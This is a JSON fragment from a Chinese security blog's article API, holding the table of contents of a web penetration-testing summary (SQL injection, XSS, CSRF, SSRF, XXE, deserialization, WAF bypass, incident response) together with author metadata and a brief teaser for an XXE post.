href=\"#%E2%91%A0%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8\"><span class=\"toc-text\">①布尔盲注</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E2%91%A1%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8\"><span class=\"toc-text\">②时间盲注</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E2%91%A2dnslog%E7%9B%B2%E6%B3%A8\"><span class=\"toc-text\">③dnslog盲注</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2%E3%80%81%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">2、报错注入</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#3%E3%80%81%E6%98%BE%E9%94%99%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2\"><span class=\"toc-text\">3、显错注入——联合查询</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#4%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">4、宽字节注入</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#5%E3%80%81Cookie%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94Access%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">5、Cookie注入——Access注入</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#7%E3%80%81%E5%81%8F%E7%A7%BB%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94Access%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">7、偏移注入——Access注入</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#8%E3%80%81%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94MSSQL%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">8、反弹注入——MSSQL注入</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#9%E3%80%81%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">9、堆叠注入</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#10%E3%80%81Oracle%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">10、Oracle注入——报错注入</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#4%E3%80%81%E9%98%B2%E8%8C%83sql%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">4、防范sql注入</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E4%BD%BF%E7%94%A8%E9%A2%84%E7%BC%96%E8%AF%91%E8%AF%AD%E5%8F%A5%E9%9B%86\"><span class=\"toc-text\">1.使用预编译语句集</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-%E4%BD%BF%E7%94%A8%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%BF%87%E6%BB%A4%E4%BC%A0%E5%85%A5%E7%9A%84%E5%8F%82%E6%95%B0\"><span class=\"toc-text\">2.使用正则表达式过滤传入的参数</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#3-%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%87%E6%BB%A4\"><span class=\"toc-text\">3.字符串过滤</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#4-%E4%B8%A5%E6%A0%BC%E5%8C%BA%E5%88%86%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90\"><span class=\"toc-text\">4.严格区分用户权限</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%B8%89%E3%80%81XSS%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB\"><span class=\"toc-text\">三、XSS注入——跨站脚本攻击</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E8%A7%A6%E5%8F%91XSS%E7%9A%84%E6%96%B9%E6%B3%95%EF%BC%9A\"><span class=\"toc-text\">触发XSS的方法：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#XSS%E5%88%86%E7%B1%BB\"><span class=\"toc-text\">XSS分类</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%EF%BC%9A\"><span class=\"toc-text\">反射型XSS：</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%AD%98%E5%82%A8%E5%9E%8BXSS%EF%BC%9A\"><span class=\"toc-text\">存储型XSS：</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#DOM%E5%9E%8BXSS%EF%BC%9A\"><span class=\"toc-text\">DOM型XSS：</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E9%98%B2%E8%8C%83XSS%EF%BC%9A\"><span class=\"toc-text\">防范XSS：</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%9B%9B%E3%80%81CSRF%E2%80%94%E2%80%94%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0\"><span class=\"toc-text\">四、CSRF——跨站请求伪造</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#CSRF%E5%8D%B1%E5%AE%B3%EF%BC%9A\"><span class=\"toc-text\">CSRF危害：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#CSRF%E5%88%86%E7%B1%BB%EF%BC%9A\"><span class=\"toc-text\">CSRF分类：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#GET%E5%9E%8B%EF%BC%9A\"><span class=\"toc-text\">GET型：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#POST%E5%9E%8B%EF%BC%9A\"><span class=\"toc-text\">POST型：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E9%93%BE%E6%8E%A5%E7%B1%BB%E5%9E%8B%EF%BC%9A\"><span class=\"toc-text\">链接类型：</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E9%98%B2%E8%8C%83csrf%E7%9A%84%E6%96%B9%E6%B3%95%EF%BC%9A\"><span class=\"toc-text\">防范csrf的方法：</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%BA%94%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">五、文件上传漏洞</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">文件上传绕过</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">文件上传黑名单绕过</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">文件上传白名单绕过</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">文件上传解析漏洞</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#IIS6-0%E7%95%B8%E5%BD%A2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">IIS6.0畸形解析漏洞</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E2%91%A0%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF\"><span class=\"toc-text\">①配置错误</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E2%91%A1%E5%88%86%E5%8F%B7%E6%88%AA%E6%96%AD\"><span class=\"toc-text\">②分号截断</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E2%91%A2%E6%96%87%E4%BB%B6%E5%A4%B9%E5%90%8D%E5%BD%B1%E5%93%8D\"><span class=\"toc-text\">③文件夹名影响</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#CGI%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">CGI解析漏洞</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%85%AD%E3%80%81%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%E3%80%81%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">六、验证码绕过、密码找回漏洞</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E9%AA%8C%E8%AF%81%E7%A0%81%E7%9A%84%E4%BD%9C%E7%94%A8\"><span class=\"toc-text\">验证码的作用</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%E5%B8%B8%E8%A7%81%E5%A7%BF%E5%8A%BF\"><span class=\"toc-text\">验证码绕过常见姿势</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">密码找回漏洞</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%B8%83%E3%80%81%E8%B6%8A%E6%9D%83\"><span class=\"toc-text\">七、越权</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%85%AB%E3%80%81SSRF%E2%80%94%E2%80%94%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0\"><span class=\"toc-text\">八、SSRF——服务器端请求伪造</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%8F%AF%E8%83%BD%E5%87%BA%E7%8E%B0%E7%9A%84%E5%9C%B0%E6%96%B9\"><span class=\"toc-text\">可能出现的地方</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%8D%B1%E5%AE%B3%EF%BC%9A\"><span class=\"toc-text\">危害：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%88SSRF%E8%83%BD%E5%81%9A%E4%BB%80%E4%B9%88%EF%BC%89%EF%BC%9A\"><span class=\"toc-text\">利用方式（SSRF能做什么）：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%AE%9E%E4%BE%8B%EF%BC%9A\"><span class=\"toc-text\">漏洞实例：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E9%98%B2%E6%8A%A4SSRF%EF%BC%9A\"><span class=\"toc-text\">防护SSRF：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#SSRF%E7%BB%95%E8%BF%87%EF%BC%9A\"><span class=\"toc-text\">SSRF绕过：</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%B9%9D%E3%80%81%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">九、支付漏洞</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%BF%AB%E6%8D%B7%E6%94%AF%E4%BB%98%E5%8E%9F%E7%90%86%EF%BC%9A\"><span class=\"toc-text\">快捷支付原理：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%B8%B8%E8%A7%81%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E%EF%BC%9A\"><span class=\"toc-text\">常见支付漏洞：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%A6%82%E4%BD%95%E6%8C%96%E6%8E%98%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E%EF%BC%9A\"><span class=\"toc-text\">如何挖掘支付漏洞：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E9%98%B2%E5%BE%A1%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E%EF%BC%9A\"><span class=\"toc-text\">防御支付漏洞：</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8D%81%E3%80%81XXE%E2%80%94%E2%80%94%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">十、XXE——实体注入</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BB%80%E4%B9%88%E6%98%AFXML%EF%BC%9A\"><span class=\"toc-text\">什么是XML：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#XXE%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9A\"><span class=\"toc-text\">XXE是什么：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#XXE%E5%8E%9F%E7%90%86%EF%BC%9A\"><span class=\"toc-text\">XXE原理：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3%EF%BC%9A\"><span class=\"toc-text\">漏洞危害：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#XXE-%E6%89%A9%E5%B1%95\"><span class=\"toc-text\">XXE-扩展</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%EF%BC%9A\"><span class=\"toc-text\">漏洞检测：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1\"><span class=\"toc-text\">漏洞防御</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8D%81%E4%B8%80%E3%80%81%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">十一、代码执行漏洞</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E9%80%A0%E6%88%90%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%9A%84%E5%87%BD%E6%95%B0\"><span class=\"toc-text\">造成代码执行的函数</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8D%81%E4%BA%8C%E3%80%81%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB%E4%B8%8E%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB\"><span class=\"toc-text\">十二、本地包含与远程包含</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BB%80%E4%B9%88%E6%98%AF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%9F\"><span class=\"toc-text\">什么是文件包含漏洞？</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%87%BD%E6%95%B0%E8%A7%A3%E6%9E%90%EF%BC%9A\"><span class=\"toc-text\">函数解析：</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8D%81%E4%B8%89%E3%80%81%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">十三、变量覆盖漏洞</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BB%80%E4%B9%88%E6%98%AF%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%EF%BC%9A\"><span class=\"toc-text\">什么是变量覆盖：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%A6%82%E4%BD%95%E5%AF%BB%E6%89%BE%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%EF%BC%9A\"><span class=\"toc-text\">如何寻找变量覆盖：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%BC%95%E5%8F%91%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%87%BD%E6%95%B0%EF%BC%9A\"><span class=\"toc-text\">引发变量覆盖漏洞的函数：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%87%BD%E6%95%B0%E8%A7%A3%E6%9E%90\"><span class=\"toc-text\">函数解析</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8D%81%E5%9B%9B%E3%80%81unserialize%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">十四、unserialize反序列化漏洞</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BB%80%E4%B9%88%E6%98%AF%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\"><span class=\"toc-text\">什么是序列化和反序列化</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BB%80%E4%B9%88%E6%98%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">什么是反序列化漏洞</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#PHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">PHP魔术方法</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">魔术方法</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%BB%E7%BB%93%EF%BC%9A\"><span class=\"toc-text\">总结：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E9%98%B2%E5%BE%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">防御反序列化漏洞</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8D%81%E4%BA%94%E3%80%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">十五、命令执行漏洞</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%AE%80%E4%BB%8B\"><span class=\"toc-text\">简介</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E4%BA%A7%E7%94%9F%E5%8E%9F%E5%9B%A0\"><span class=\"toc-text\">漏洞产生原因</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#PHP%E4%B8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0\"><span class=\"toc-text\">PHP下命令执行函数</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8D%81%E5%85%AD%E3%80%81%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F\"><span class=\"toc-text\">十六、内网渗透</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F\"><span class=\"toc-text\">内网渗透</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%9F%9F%E6%B8%97%E9%80%8F\"><span class=\"toc-text\">域渗透</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8D%81%E4%B8%83%E3%80%81APP%E6%B8%97%E9%80%8F\"><span class=\"toc-text\">十七、APP渗透</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8D%81%E5%85%AB%E3%80%81%E7%BB%95%E8%BF%87WAF\"><span class=\"toc-text\">十八、绕过WAF</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#sql%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">sql绕过</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#webshell%E7%9A%84%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">webshell的绕过</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%87%E6%89%8B%E6%B3%95%EF%BC%9A\"><span class=\"toc-text\">常见绕过手法：</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8D%81%E4%B9%9D%E3%80%81%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94\"><span class=\"toc-text\">十九、应急响应</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90%EF%BC%9A\"><span class=\"toc-text\">流程分析：</span></a></li></ol></li></ol>","author":{"name":"kiku","slug":"blog-author","avatar":"https://samedi.gitee.io/favicon.png","link":"/","description":"网络运维,linux运维,web渗透","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"XXE总结","uid":"95bc868529d0f6b6803edcb16b8de2ee","slug":"XXE总结","date":"2022-10-09T11:42:15.000Z","updated":"2022-10-09T11:43:26.445Z","comments":true,"path":"api/articles/XXE总结.json","keywords":null,"cover":"https://pics1.baidu.com/feed/4ec2d5628535e5dd3a7e1e7eab7ae7e5cf1b620c.jpeg@f_auto?token=177c76f881665fd7d74d4328b18b7877","text":"XXEXXE基础XXE漏洞全称XML External Entity Injection，即xml外部实体注入了漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。 XML基础X...","link":"","photos":[],"count_time":{"symbolsCount":"3.8k","symbolsTime":"3 mins."},"categories":[{"name":"XXE","slug":"XXE","count":1,"path":"api/categories/XXE.json"}],"tags":[{"name":"XXE","slug":"XXE","count":1,"path":"api/tags/XXE.json"}],"author":{"name":"kiku","slug":"blog-author","avatar":"https://samedi.gitee.io/favicon.png","link":"/","description":"网络运维,linux运维,web渗透","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true},"next_post":{}}